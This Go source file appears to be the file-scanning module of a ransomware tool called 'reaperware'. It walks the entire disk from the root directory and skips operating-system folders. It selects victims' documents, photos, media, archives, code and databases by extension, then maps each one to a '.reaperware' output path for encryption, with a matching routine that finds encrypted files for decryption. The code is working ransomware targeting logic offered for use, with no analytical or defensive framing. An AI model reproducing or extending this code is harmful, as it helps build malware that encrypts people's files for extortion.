package filedirectory

import (
	"context"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

var (
	// Define targeted file extensions
	Extensions = []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".csv",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff", ".svg", ".raw",
		".mp4", ".mov", ".avi", ".wmv", ".mkv", ".mp3", ".wav",
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
		".html", ".htm", ".php", ".js", ".css", ".java", ".py", ".c", ".cpp", ".sql",
		".db", ".mdb", ".accdb", ".sqlite",
		".psd", ".ai", ".dwg", ".indd",
		".xml", ".json", ".log", ".ini", ".config",
	}
	// Define directories to exclude (case-sensitive)
	ExcludedDirs = []string{
		"/proc", "/sys", "/dev", // Linux system directories
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", // Windows system directories
	}
	// Encrypted file extension
	EncryptedExtension = []string{
		".reaperware",
	}
)

func RootDir() string {
	// Determine root directory
	rootDir := "/"
	if runtime.GOOS == "windows" {
		rootDir = "C:\\"
	}
	return rootDir
}

type FileScanner struct {
	RootDir          string   // Directory to start scanning
	TargetExtensions []string // List of targeted file extensions
	ExcludedDirs     []string // List of directories to exclude
	MaxFileSize      int64    // 0 = no limit; skip larger files during scan
	Results          chan string
	ScannedFiles     []string // Store scanned file paths
}

// NewFileScanner creates a new FileScanner instance
func NewFileScanner(rootDir string, extensions, excludedDirs []string, maxFileSize int64) *FileScanner {
	return &FileScanner{
		RootDir:          rootDir,
		TargetExtensions: extensions,
		ExcludedDirs:     excludedDirs,
		MaxFileSize:      maxFileSize,
		Results:          make(chan string, 100), // Buffered channel
	}
}

// Start initiates the file scanning process
func (fs *FileScanner) Start(ctx context.Context) {
	// Launch results printer in a goroutine
	go fs.printResults()

	log.Println("[+] Scanning for files")
	err := filepath.WalkDir(fs.RootDir, func(path string, d os.DirEntry, walkErr error) error {
		if err := ctx.Err(); err != nil {
			return err
		}
		if walkErr != nil {
			log.Printf("[-] Error accessing %s: %v\n", path, walkErr)
			return nil
		}

		if d.IsDir() && fs.isExcludedDir(path) {
			log.Printf("[-] Skipping excluded directory: %s\n", path)
			return filepath.SkipDir
		}

		if !d.IsDir() && fs.isTargetFile(d.Name()) {
			info, ierr := d.Info()
			if ierr != nil {
				log.Printf("[-] Error stating %s: %v\n", path, ierr)
				return nil
			}
			if fs.MaxFileSize > 0 && info.Size() > fs.MaxFileSize {
				log.Printf("[-] Skipping (exceeds -max-file-size): %s size=%d max=%d\n", path, info.Size(), fs.MaxFileSize)
				return nil
			}
			fs.ScannedFiles = append(fs.ScannedFiles, path)
			fs.Results <- path
		}
		return nil
	})
	if err != nil {
		if err == context.Canceled {
			log.Println("[-] Scan cancelled")
		} else {
			log.Printf("[-] File walk failed: %v\n", err)
		}
	}

	// Close the results channel
	close(fs.Results)
}

// isTargetFile checks if a file has a targeted extension
func (fs *FileScanner) isTargetFile(fileName string) bool {
	ext := strings.ToLower(filepath.Ext(fileName))
	for _, targetExt := range fs.TargetExtensions {
		if ext == targetExt {
			return true
		}
	}
	return false
}

// isExcludedDir checks if a directory is in the exclusion list
func (fs *FileScanner) isExcludedDir(dir string) bool {
	normalizedDir := filepath.Clean(dir)
	if runtime.GOOS == "windows" {
		normalizedDir = strings.ToLower(normalizedDir)
	}

	for _, excludedDir := range fs.ExcludedDirs {
		normalizedExcludedDir := filepath.Clean(excludedDir)
		if runtime.GOOS == "windows" {
			normalizedExcludedDir = strings.ToLower(normalizedExcludedDir)
		}

		if strings.HasPrefix(normalizedDir, normalizedExcludedDir) {
			return true
		}
	}
	return false
}

// printResults continuously reads from the Results channel and prints each file path
func (fs *FileScanner) printResults() {
	for file := range fs.Results {
		log.Println(file)
	}
}

func (fs *FileScanner) ToFileTasks() []FileTask {
	// Use a map to track unique input file paths
	uniqueFiles := make(map[string]bool)
	var fileTasks []FileTask

	for _, inputFilePath := range fs.ScannedFiles {

		// BUG: Need to see why we get duplicates
		// Check if the file path is already processed
		if _, exists := uniqueFiles[inputFilePath]; exists {
			continue // Skip duplicates
		}

		// Mark the file path as processed
		uniqueFiles[inputFilePath] = true

		outputFilePath := inputFilePath + ".reaperware"
		decryptedFilePath := inputFilePath + ".dec"
		fileTasks = append(fileTasks, FileTask{
			InputFilePath:  inputFilePath,
			OutputFilePath: outputFilePath,
			DecryptedPath:  decryptedFilePath,
		})
	}
	return fileTasks
}

// Create a FileTask to decrypt files
func (fs *FileScanner) ToDecryptTasks() []FileTask {
	var decryptTasks []FileTask
	for _, encryptedFilePath := range fs.ScannedFiles {
		// Generate paths for the decrypted file
		decryptedFilePath := strings.TrimSuffix(encryptedFilePath, ".reaperware")
		decryptTasks = append(decryptTasks, FileTask{
			InputFilePath:  encryptedFilePath,
			OutputFilePath: decryptedFilePath, // You can change this to match your decryption logic
			DecryptedPath:  decryptedFilePath,
		})
	}
	return decryptTasks
}

func FindTheEncryptedFiles(ctx context.Context, rootDir string, maxFileSize int64) []FileTask {
	// Initialize the FileScanner for `.reaperware` files
	fileScanner := NewFileScanner(rootDir, EncryptedExtension, ExcludedDirs, maxFileSize)

	// Start scanning
	fileScanner.Start(ctx)

	// Convert `.reaperware` files into FileTask entries for further processing
	return fileScanner.ToDecryptTasks()
}
